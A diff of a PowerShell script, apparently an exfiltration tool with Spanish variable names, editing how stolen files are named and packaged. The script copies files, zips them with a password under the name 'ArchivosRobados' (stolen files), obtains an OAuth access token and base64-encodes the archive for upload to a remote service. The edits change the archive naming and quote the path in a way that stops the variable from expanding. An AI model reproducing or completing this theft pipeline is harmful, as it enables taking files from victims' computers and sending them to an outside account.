@@ -141,7 +141,7 @@ For($i = 1; $i -le $files.count; $i++)
 
 $files | Select name
 Write-Host "[+] Files copied" -ForegroundColor Green
-$ArchivosRobados = "$env:computername-$(get-date -f yyyy-MM-dd)"
+$ArchivosRobados = "$env:computername"
 Compress-7Zip -Path $Destination -ArchiveFileName c:\temp\ArchivosRobados-"$ArchivosRobados".zip -Format Zip -Password "$pwd1"
 
 Start-Sleep -s 5
@@ -170,13 +170,13 @@ $params = @{
 $accessToken = (Invoke-RestMethod @params).access_token
 
 # Change this to the file you want to upload
-$ArchivosRobados = "$env:computername-$(get-date -f yyyy-MM-dd)"
+$ArchivosRobados = "$env:computername"
 #$FileEncrypted = 'c:\temp\ArchivosRobados-"$ArchivosRobados".zip'
 
 Write-Host "Nombre de archivos Robados: $ArchivosRobados" -ForegroundColor Green
 
 # Get the source file contents and details, encode in base64
-$sourceItem = Get-Item c:\temp\ArchivosRobados-"$ArchivosRobados".zip
+$sourceItem = Get-Item 'c:\temp\ArchivosRobados-"$ArchivosRobados".zip'
 $sourceBase64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($sourceItem.FullName))
 $sourceMime = [System.Web.MimeMapping]::GetMimeMapping($sourceItem.FullName)
 
